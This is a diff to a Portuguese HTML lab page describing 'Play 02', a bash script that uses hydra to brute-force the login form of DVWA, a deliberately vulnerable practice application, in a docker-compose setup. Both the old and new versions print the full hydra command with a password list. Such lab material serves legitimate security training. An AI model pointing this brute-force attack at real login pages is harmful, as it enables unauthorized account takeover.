@@ -1,34 +1,43 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Play 02 — Hydra DVWA</title>
+  <meta charset="UTF-8"/>
+  <title>play-02-hydra-dvwa — Detalhes</title>
   <link rel="stylesheet" href="../style.css"/>
 </head>
 <body class="neon-dark">
-  <div class="post-modal-container">
-    <div class="post-modal-content">
-      <h1>Play 02 — Hydra DVWA</h1>
-      <p>Este Play utiliza o <code>hydra</code> para realizar ataque de força bruta na interface de login do DVWA.</p>
-      <h2>Script <code>run.sh</code></h2>
-      <pre><code>#!/bin/bash
-echo "[*] Iniciando ataque com Hydra..."
-hydra -L users.txt -P passwords.txt dvwa http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
-echo "[✓] Ataque finalizado."</code></pre>
-    </div>
-    <div class="post-modal-actions">
-      <button id="go-play" class="btn neon-btn">▶ Ir ao Play</button>
-      <button id="go-home" class="btn neon-btn">🔙 Voltar à Home</button>
-    </div>
-    <div class="post-modal-footer">
-      <p class="curiosity">
-        🧠 Quer se aprofundar em <strong>HYDRA</strong>?
-        <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">
-          Explore a documentação oficial →
-        </a>
-      </p>
-    </div>
-  </div>
+  <article>
+    <h1>Play 02 Hydra Dvwa</h1>
+    <p>Este Play executa o comando <code>cd "$(dirname "$0")"</code>, permitindo avaliar aspectos específicos de segurança.</p>
+    <h2>Script <code>run.sh</code></h2>
+    <pre><code>#!/usr/bin/env bash
+#
+# denis-play-backend/plays/play-02-hydra-dvwa/run.sh
+
+# muda para o diretório do script
+cd "$(dirname "$0")"
+
+# host e porta padrão (serviço docker-compose)
+HOST=${1:-dvwa}
+PORT=${2:-80}
+
+echo "[*] Iniciando ataque com Hydra contra $HOST:$PORT..."
+sleep 1
+
+# hydra espera primeiro o HOST (sem :porta) e -s porta separadamente
+hydra -l admin \
+      -P passwords.txt \
+      -s "$PORT" \
+      "$HOST" http-form-post \
+      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
+      -t 4 -V > resultado.txt
+
+echo
+echo "[📄] Saída do Hydra:"
+cat resultado.txt
+echo
+echo "[✔️] Teste concluído com sucesso."
+</code></pre>
+  </article>
 </body>
 </html>
